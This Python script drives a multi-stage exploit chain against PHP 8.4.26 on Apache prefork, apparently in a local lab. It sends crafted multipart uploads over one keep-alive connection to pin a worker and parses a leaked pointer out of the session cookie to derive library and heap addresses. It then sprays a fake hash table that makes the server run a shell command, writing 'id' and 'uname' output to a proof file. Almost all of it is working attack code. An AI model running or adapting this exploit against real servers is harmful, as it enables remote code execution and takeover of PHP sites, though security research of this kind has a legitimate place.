#!/usr/bin/env python3
"""Keep-alive / multi-worker probe for the 8.4.26 pure chain.

Question: can A1, B1, A2, B2 be pinned to one prefork child by sending all
four requests over one HTTP/1.1 keep-alive connection?

The script:
  1. sends two GET /pid.php on one socket (baseline affinity);
  2. sends A1 + GET /pid.php on one socket;
  3. if the socket survived A1, sends B1 + GET /pid.php;
  4. if it survived B1, sends A2 + GET /pid.php;
  5. if it survived A2, sends B2 and waits for /out proof.

Every response's status, Connection header, Content-Length, and body size are
printed. A closed socket at any stage is a hard result: keep-alive pinning is
not possible for that stage in this Apache configuration.

usage:
  python3 keepalive_probe.py --port 18112 [--stage all|a1|b1|a2|b2]
"""
from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse
from collections import Counter
import struct

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.dirname(HERE)
PAYLOADS = os.path.join(LAB, "payloads")
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
BOUNDARY = b"C" * 10


def read_response(sock: socket.socket, buf: bytes, timeout: float = 30.0):
    sock.settimeout(timeout)
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            raise EOFError("closed before response headers")
        buf += chunk
    head, buf = buf.split(b"\r\n\r\n", 1)
    lines = head.split(b"\r\n")
    status = lines[0].decode("latin1", "replace")
    headers: dict[bytes, bytes] = {}
    for line in lines[1:]:
        k, _, v = line.partition(b":")
        headers[k.strip().lower()] = v.strip()
    body = b""
    te = headers.get(b"transfer-encoding", b"").lower()
    cl = headers.get(b"content-length")
    if b"chunked" in te:
        while True:
            while b"\r\n" not in buf:
                chunk = sock.recv(65536)
                if not chunk:
                    raise EOFError("closed in chunk size")
                buf += chunk
            line, buf = buf.split(b"\r\n", 1)
            size = int(line.split(b";")[0], 16)
            need = size + 2
            while len(buf) < need:
                chunk = sock.recv(65536)
                if not chunk:
                    raise EOFError("closed in chunk body")
                buf += chunk
            body += buf[:size]
            buf = buf[size + 2:]
            if size == 0:
                break
    elif cl is not None:
        n = int(cl)
        while len(buf) < n:
            chunk = sock.recv(65536)
            if not chunk:
                raise EOFError("closed in body")
            buf += chunk
        body = buf[:n]
        buf = buf[n:]
    else:
        # No framing. Apache normally sends Content-Length or chunked; if it
        # explicitly says close, drain to EOF.
        if headers.get(b"connection", b"").lower() == b"close":
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                body += chunk
    return status, headers, body, buf


def send_chunked(sock: socket.socket, host: str, port: int, path: str,
                 body: bytes, keep_alive: bool = True) -> None:
    conn = b"keep-alive" if keep_alive else b"close"
    hdr = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Transfer-Encoding: chunked\r\nConnection: %s\r\n\r\n")
           % (path, host, port, BOUNDARY.decode(), conn.decode())).encode()
    sock.sendall(hdr)
    for i in range(0, len(body), 65536):
        piece = body[i:i + 65536]
        sock.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
    sock.sendall(b"0\r\n\r\n")


def send_plain(sock: socket.socket, host: str, port: int, path: str,
               body: bytes, keep_alive: bool = True) -> None:
    conn = b"keep-alive" if keep_alive else b"close"
    hdr = (("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: %s\r\n\r\n")
           % (path, host, port, BOUNDARY.decode(), len(body), conn.decode())).encode()
    sock.sendall(hdr + body)


def send_get(sock: socket.socket, host: str, port: int, path: str) -> None:
    req = (("GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: keep-alive\r\n\r\n")
           % (path, host, port)).encode()
    sock.sendall(req)


def describe(label: str, resp) -> None:
    status, headers, body, _ = resp
    print("%-18s status=%r conn=%r clen=%r te=%r body=%d cookie=%d"
          % (label, status[:40], headers.get(b"connection", b""),
             headers.get(b"content-length", b""),
             headers.get(b"transfer-encoding", b""), len(body),
             len(headers.get(b"set-cookie", b""))))


def get_pid(sock: socket.socket, buf: bytes, host: str, port: int):
    send_get(sock, host, port, "/pid.php")
    status, headers, body, buf = read_response(sock, buf)
    describe("GET /pid.php", (status, headers, body, buf))
    try:
        pid = int(body.strip().splitlines()[0])
    except Exception:
        pid = None
    return pid, buf


def generate_a1(tmp: str) -> bytes:
    out = os.path.join(tmp, "a.bin")
    subprocess.run([sys.executable, os.path.join(PAYLOADS, "mk_a1.py"),
                    "--out", out, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    with open(out, "rb") as fh:
        return fh.read()


def generate_b1(tmp: str) -> bytes:
    out = os.path.join(tmp, "b1.bin")
    subprocess.run([sys.executable, os.path.join(PAYLOADS, "mk_leak_b.py"),
                    "--out", out, "--spec", LEAK_SPEC,
                    "--fake-len", "0xC8000", "--tag"], check=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    with open(out, "rb") as fh:
        return fh.read()


def parse_leak(headers: dict[bytes, bytes]):
    raw = headers.get(b"set-cookie", b"")
    marker = b"PHPSESSID="
    if marker not in raw:
        return None
    val = raw.split(marker, 1)[1].split(b";", 1)[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7f0000000000 <= q <= 0x7fffffffffff:
            counts[q] += 1
    if not counts:
        return None
    zdtor, _ = counts.most_common(1)[0]
    buckets = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    return dec, zdtor, buckets


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18112)
    ap.add_argument("--stage", choices=["all", "a1", "b1", "a2", "b2"],
                    default="all")
    args = ap.parse_args()

    print("=== baseline keep-alive affinity ===")
    s = socket.create_connection((args.host, args.port), timeout=10)
    buf = b""
    try:
        send_get(s, args.host, args.port, "/pid.php")
        st, hd, bd, buf = read_response(s, buf)
        describe("GET /pid.php #1", (st, hd, bd, buf))
        pid1 = int(bd.strip().splitlines()[0])
        send_get(s, args.host, args.port, "/pid.php")
        st, hd, bd, buf = read_response(s, buf)
        describe("GET /pid.php #2", (st, hd, bd, buf))
        pid2 = int(bd.strip().splitlines()[0])
        print("baseline pids: %d %d (same=%s)" % (pid1, pid2, pid1 == pid2))
    except Exception as exc:
        print("baseline failed:", repr(exc))
        s.close()
        return 1
    s.close()

    tmp = tempfile.mkdtemp(prefix="p2s-ka-")
    try:
        print("=== A1 + GET on one connection ===")
        a1 = generate_a1(tmp)
        print("A1 body bytes:", len(a1))
        s = socket.create_connection((args.host, args.port), timeout=120)
        buf = b""
        try:
            send_chunked(s, args.host, args.port, "/index.php" + Q, a1)
            st, hd, bd, buf = read_response(s, buf, timeout=120)
            describe("A1", (st, hd, bd, buf))
            pid, buf = get_pid(s, buf, args.host, args.port)
            print("A1 socket survived; pid after A1:", pid)
        except Exception as exc:
            print("A1 socket did not survive:", repr(exc))
            s.close()
            return 0
        if args.stage == "a1":
            s.close()
            return 0

        print("=== B1 + GET on the same connection ===")
        b1 = generate_b1(tmp)
        print("B1 body bytes:", len(b1))
        try:
            send_chunked(s, args.host, args.port, "/index.php", b1)
            st, hd, bd, buf = read_response(s, buf, timeout=180)
            describe("B1", (st, hd, bd, buf))
            leak = parse_leak(hd)
            if leak:
                dec, zdtor, buckets = leak
                print("B1 leak: decoded=%d zdtor=%#x buckets=%s"
                      % (len(dec), zdtor, [(hex(b), c) for b, c in buckets.most_common(5)]))
            else:
                print("B1 leak: not found in headers")
            pid, buf = get_pid(s, buf, args.host, args.port)
            print("B1 socket survived; pid after B1:", pid)
        except Exception as exc:
            print("B1 socket did not survive:", repr(exc))
            s.close()
            return 0
        if args.stage == "b1":
            s.close()
            return 0

        print("=== A2 + GET on the same connection ===")
        sys.path.insert(0, PAYLOADS)
        from cheap_oom_a import build_body as build_a2  # type: ignore
        a2 = build_a2(880, 64, 115, b"a" * 32, b"k0", BOUNDARY)
        print("A2 body bytes:", len(a2))
        try:
            send_plain(s, args.host, args.port, "/index.php", a2)
            st, hd, bd, buf = read_response(s, buf, timeout=120)
            describe("A2", (st, hd, bd, buf))
            pid, buf = get_pid(s, buf, args.host, args.port)
            print("A2 socket survived; pid after A2:", pid)
        except Exception as exc:
            print("A2 socket did not survive:", repr(exc))
            s.close()
            return 0
        if args.stage == "a2":
            s.close()
            return 0

        print("=== B2 on the same connection ===")
        from mk_ht import build as build_ht  # type: ignore
        from fake_ref_b import make_spray, make_name  # type: ignore
        # Use the first main candidate from the B1 leak, if available.
        if not leak:
            print("no leak; cannot build B2")
            s.close()
            return 0
        dec, zdtor, buckets = leak
        lib = zdtor - 0x65EB60
        lib_bucket = zdtor & ~0x1FFFFF
        id_bucket = buckets.most_common(1)[0][0]
        cands = [(b, c) for b, c in buckets.most_common()
                 if b not in (lib_bucket, id_bucket)]
        cands.sort(key=lambda bc: (abs(bc[1] - 87), bc[1]))
        if not cands:
            print("no main candidate")
            s.close()
            return 0
        main_chunk = cands[0][0]
        S = main_chunk + 0xF8398
        zif = lib + 0x465370
        cmd = "rm -f /out/ka; (id; uname -a) > /out/ka 2>&1"
        ht = build_ht(S, zif, cmd.encode(), 384)
        spray = make_spray(384, S, 1, 0x0107, 8, 32)

        def part(name: bytes, value: bytes) -> bytes:
            return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                    name + b"\"\r\n\r\n" + value + b"\r\n")

        body = bytearray()
        for i in range(500):
            body += part(make_name(b"s", i, 10), spray)
        body += part(b"ht", ht)
        body += part(b"PHPSESSID", b"a" * 32)
        body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
        for i in range(495):
            body += part(make_name(b"t", i, 10), spray)
        body += b"--" + BOUNDARY + b"--\r\n"
        print("B2 main=%#x S=%#x zif=%#x cmd=%r" % (main_chunk, S, zif, cmd))
        try:
            send_plain(s, args.host, args.port, "/index.php", bytes(body))
            st, hd, bd, buf = read_response(s, buf, timeout=120)
            describe("B2", (st, hd, bd, buf))
        except Exception as exc:
            print("B2 socket did not survive:", repr(exc))
        s.close()
        time.sleep(0.5)
        proof = os.path.join(LAB, "multi-out", "ka")
        if os.path.exists(proof):
            print("PROOF %s:" % proof)
            print(open(proof, "r", errors="replace").read())
        else:
            print("no proof at", proof)
    finally:
        import shutil
        shutil.rmtree(tmp, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
